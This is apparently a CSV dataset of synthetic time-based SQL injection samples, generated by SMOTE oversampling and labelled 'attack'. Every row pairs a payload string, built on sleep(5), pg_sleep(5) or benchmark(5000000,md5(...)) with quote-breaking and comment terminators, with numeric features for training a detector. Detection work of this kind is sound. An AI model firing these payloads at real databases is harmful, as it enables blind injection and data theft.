id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,time,"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000124,1.1224172882353918,67.71961411970526,19.348461177058642,2.8225395892737457,10.0,10.0,36.696922354117284,11.022691765587963,0.14802808589636,0.14802808589635996,0.5418229542492994,0.1621208739579806,0.0,0.674230588529321,0.0,0.0,0.0,1.0,0.0,6.674230588529321,0.674230588529321,0.0,1.0,1.0,0.0,0.6742305885293212,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000033,attack,time,"1""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""eefg""  =  ""eefg",nearest_attack_euclidean,R000023,0.08215706415501456,80.33887689846713,19.039867870407896,2.7047356264958626,21.019933935203948,2.1594714816315914,44.119603611223695,13.039867870407898,0.26178844071501367,0.02655669648628775,0.5493115599697606,0.16234330282893802,0.0,4.0,0.0,0.0,0.0,1.019933935203949,0.0,8.0,0.0,0.0,0.019933935203948816,1.019933935203949,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0199339352039487,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.019933935203949
SMOTE_000034,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000059,1.3878618441817199,60.09182255607779,18.584546079439683,3.1481083090782827,24.33818431775874,1.0,26.753638238319056,8.0,0.40445527935396197,0.016697329207460948,0.4452687577788895,0.13357863365968753,0.0,3.0,0.0,0.0,0.0,0.4154539205603156,0.0,4.584546079439685,0.0,0.0,0.0,0.4154539205603156,0.0,1.0,0.0,0.0,0.0,0.4154539205603156,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,time,1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #,nearest_attack_euclidean,R000054,0.4545749515931535,61.78103565696388,22.0,3.3294533613826482,18.847629457120487,10.0,27.085776742722913,5.847629457120485,0.3055010038430813,0.16224809334209556,0.43767242031646597,0.09457848249835707,0.0,0.0,0.0,0.0,0.0,1.0,0.0,3.847629457120485,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8476294571204853,0.1523705428795147,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000036,attack,time,"1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf",nearest_attack_euclidean,R000078,0.3328839843443917,59.36927946807728,21.091285297871817,3.33696987773628,15.091285297871819,10.730282382974549,25.456426489359096,8.091285297871819,0.2550201594840355,0.1791836522276219,0.4292018775816947,0.1365943107066479,0.0,0.0,2.0,0.0,0.0,1.0912852978718186,0.0,4.0,0.0,0.0,1.0,3.091285297871819,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0912852978718186,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.091285297871819
SMOTE_000037,attack,time,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000250,0.4484164143484456,86.9183096821628,26.416338063567437,3.6280096762725504,24.0,18.0,35.334647745730244,9.583661936432561,0.2763457153060584,0.20725928647954378,0.4062073556888668,0.11018764252553101,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.583661936432561,0.0,0.9999999999999999,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000038,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000291,0.5157270589462666,89.67454717211683,26.168636793029208,3.3958974037630694,20.00236415163505,18.0,40.00472830327009,11.667454717211683,0.22242662770475857,0.20236531903106453,0.44485325540951715,0.13035479785465967,0.0,1.0,2.0,0.0,0.0,2.0,0.0,5.667454717211682,0.0,0.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000039,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000226,1.0218364818567511,68.19648959754754,20.957191678038033,3.0316038886915275,18.717893758528525,3.9143833560760646,34.56421248294295,11.0,0.2741629496404551,0.05594334694485931,0.5084429126959922,0.16145079071869342,4.0,0.0,0.0,0.0,0.0,1.2392979195095082,0.0,5.521404160980984,0.0,0.0,0.23929791950950818,1.2392979195095082,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000294,0.6657214012522212,71.6986891100592,25.6986891100592,3.5901623742877375,15.0,21.0,28.0,7.6986891100592,0.20921746153151644,0.29290444614412303,0.39053926152549734,0.10733883079886322,0.6986891100591996,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.6986891100591998,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000041,attack,time,"1"" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000213,1.4165509820191933,88.21868867893636,26.828033018404547,3.8320654282901705,21.39065566053182,28.21868867893636,30.0,8.609344339468182,0.24256436672215786,0.31978836636138214,0.34010581681930896,0.0975414500971511,0.0,0.6093443394681816,0.0,0.0,0.0,2.0,0.0,4.0,0.0,0.0,1.0,2.0,0.0,0.6093443394681817,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.6093443394681816,0.39065566053181844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,time,"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg",nearest_attack_euclidean,R000155,0.6511953759238364,96.41238573809703,20.0,2.9652836963897853,20.824771476194066,11.175228523805936,50.0,14.412385738097031,0.21560030450645046,0.11638103419002388,0.5187208417132411,0.14929781959028451,3.412385738097032,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.853096434524258,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000087,1.3918937953890413,69.93015700653676,26.84716528664811,3.86479039683145,25.82388428882703,10.0,23.259107431061626,10.84716528664811,0.3675248131129751,0.14534897609092506,0.33181058427402055,0.15531562652207928,3.2823884288827028,0.0,0.0,0.0,0.0,1.0,0.0,3.282388428882703,0.0,0.0,0.0,3.5647768577654064,1.0,0.0,0.0,0.7176115711172969,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.28238842888270316,0.7176115711172969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000044,attack,time,1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  ',nearest_attack_euclidean,R000113,0.48263530009250605,95.54962008780396,25.324430131705945,3.2669664946426513,32.549620087803966,2.0,45.0,16.0,0.34060572534703565,0.020933151576284573,0.4709959104664031,0.16746521261027666,4.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.225189956098018,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.225189956098018
SMOTE_000045,attack,time,"1"" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000222,0.9754195683746815,90.59510067129762,28.398775167824404,3.823007014955243,20.0,29.0,31.59510067129762,10.0,0.2208648044670832,0.32025396647727067,0.34844882682210454,0.11043240223354159,0.0,0.6012248321755953,2.0,0.0,0.0,2.0,0.0,4.398775167824405,0.0,0.0,1.0,4.0,0.0,0.6012248321755953,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,time,"1""   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #",nearest_attack_euclidean,R000182,0.5311119307250111,62.77741125037038,21.777411250370378,3.2861443279291436,18.0,10.0,28.0,6.777411250370378,0.2867400403208738,0.15930002240048546,0.44604006272135927,0.1079198745572814,0.0,0.7774112503703778,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,1.0,0.0,0.777411250370378,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,time,"1%""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000205,1.4435705004780612,97.0,20.897210447277217,2.7830419126352197,27.44860522363861,2.0,53.0,14.551394776361391,0.28297531158390316,0.020618556701030924,0.5463917525773195,0.15001437913774632,0.0,1.0,0.0,0.0,1.0,0.0,0.0,11.0,0.5513947763613921,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.44860522363860783,0.5513947763613922,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000048,attack,time,"1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000116,0.7131715599439722,73.3012964966449,26.30129649664489,3.661343686106878,16.0,21.0,28.0,8.301296496644891,0.2182856823498115,0.2864999580841276,0.38199994411217014,0.11321441545389077,0.0,0.3012964966448913,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.0,0.3012964966448913,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000049,attack,time,1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000198,0.7183803781272171,76.67382303440887,19.673823034408873,2.9941983049394847,27.0,2.0,38.0,9.673823034408873,0.35215426829647306,0.026085501355294305,0.49562452575059174,0.12613570459764087,0.6738230344088733,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,0.6738230344088734,0.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000050,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000035,1.1269088611956812,82.26374974748461,27.27362502525154,3.6231746445699944,21.084624823239228,16.641750151509232,33.08462482323923,11.452749949496923,0.25492186129932365,0.20479882614368872,0.40124892059817613,0.13903039195881145,0.0,2.4527499494969227,0.0,0.0,0.0,1.0,0.0,5.726374974748461,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.27362502525153876,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.7263749747484614,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7263749747484614
SMOTE_000051,attack,time,1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000098,0.197378467174727,83.89228580831548,26.89228580831547,3.2909133680176725,20.0,10.0,41.0,12.89228580831547,0.23840422889180873,0.11920211444590437,0.4887286692282079,0.15366498743407897,1.0,0.0,2.0,0.0,0.0,1.0,0.0,7.0,0.8922858083154714,0.9999999999999999,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,time,1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +',nearest_attack_euclidean,R000177,2.1175573230487283,82.41731164485174,26.299502156454025,3.6514232867540426,23.379701293872415,13.67920345032644,32.51880517548966,12.83960172516322,0.2882766177296511,0.16249942931875308,0.39323254018752274,0.1559914127640731,4.0,0.0,0.0,0.0,0.0,1.459900431290805,0.0,4.91980086258161,0.0,0.0,0.45990043129080505,3.459900431290805,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000053,attack,time,1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000301,0.011026308076040095,65.00496704382104,22.004967043821036,3.3513500064135435,19.0,10.0,29.0,7.004967043821038,0.29228569374531477,0.15383457565542882,0.4461202694007436,0.10775946119851287,0.004967043821037409,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.9999999999999999,0.0,1.0,0.0049670438210373535,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000054,attack,time,"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",nearest_attack_euclidean,R000146,0.042644754807110365,57.0194729043266,18.980527095673402,3.36712070907276,25.019472904326598,1.9805270956734002,22.038945808653196,7.980527095673402,0.4387849766903966,0.03474019922708127,0.38650680798489023,0.1399680160976319,0.0,3.9805270956734007,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,2.220446049250313e-16,0.0,1.0,0.0,0.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.01947290432659876,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.019472904326599
SMOTE_000055,attack,time,"1%""   )    )     )   rlike sleep  (  5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000176,0.11444020960043433,73.39299968089315,18.0,2.5304354651548993,13.0,2.0,43.514399744714524,14.878599936178631,0.1773418505380889,0.02728336162124445,0.5926464516785422,0.20272833616212446,0.0,4.0,0.0,0.0,0.0,1.0,0.0,7.878599936178631,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000056,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000226,1.0173426733934192,68.19122770371696,20.952982162973566,3.0309267256410584,18.714736622230177,3.905964325947135,34.570526755539646,11.0,0.27413873445740394,0.05582859751886901,0.5085698787909092,0.16146278923281787,4.0,0.0,0.0,0.0,0.0,1.2382455407433919,0.0,5.523508918513216,0.0,0.0,0.23824554074339188,1.2382455407433919,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000057,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,nearest_attack_euclidean,R000282,0.1464349613787377,65.93403513986112,22.93403513986112,3.409417669939415,19.0,10.0,29.0,7.934035139861119,0.28817093994000903,0.15166891575789948,0.4398398556979085,0.12032028860418295,0.9340351398611186,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.9999999999999999,0.0,1.0,0.9340351398611186,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,time,"1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R000014,3.5984787547588772,98.55061131391886,26.89877737216227,3.6311995245344026,25.449388686081136,18.0,39.0,16.10122262783773,0.25826883086725017,0.18265192706137504,0.3957458419663125,0.16333340010506228,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,5.101222627837728,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5506113139188641,1.0,0.0,1.0,0.0,0.4493886860811359,0.5506113139188642,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000059,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mcyv""  =  ""mcyv",nearest_attack_euclidean,R000135,1.3355411400890274,65.09297527267441,18.474380218139522,2.868527827332776,19.525619781860478,1.6185950545348806,33.71157032720928,10.237190109069761,0.30152695485712877,0.02461721668475883,0.516930212351166,0.15692561610694644,0.0,3.61859505453488,0.0,0.0,0.0,1.0,0.0,5.618595054534881,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3814049454651197,0.0,0.0,0.0,1.0,0.6185950545348804,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000190,1.037130989588392,87.88678473821312,26.866035421463934,3.687020250169477,31.866035421463934,10.0,34.73207084292787,11.288678473821312,0.36273965126189817,0.11407209320345124,0.3946702322337878,0.12851802330086282,4.0,0.0,0.0,0.0,0.0,1.7113215261786885,0.0,4.577356947642623,0.0,0.9999999999999999,0.0,1.7113215261786883,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7113215261786885,0.2886784738213117,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000061,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000108,0.2347906856741906,64.9013606418325,22.901360641832504,3.4873104723126334,19.0,10.0,27.0,8.901360641832504,0.292758208607015,0.15408326768790265,0.41602482275733715,0.13713370094774524,0.0,0.901360641832504,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.9999999999999999,0.0,3.0,0.0,0.901360641832504,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000062,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000043,0.07271519023697527,57.03961864807074,18.01980932403537,2.8993193002773467,16.158474592282968,1.0,28.920762703858514,10.960381351929257,0.28319927249211935,0.017532078903339063,0.5070872831774855,0.19218136542705605,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.980190675964629,0.9801906759646288,0.9999999999999999,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000063,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000262,0.02222688602696681,73.95602249785233,27.010994375536917,3.700918492158862,16.0,21.0,27.956022497852327,9.0,0.2163520540606878,0.2839620709546527,0.37798784457552265,0.12169803040913689,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.989005624463083,0.010994375536917678,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
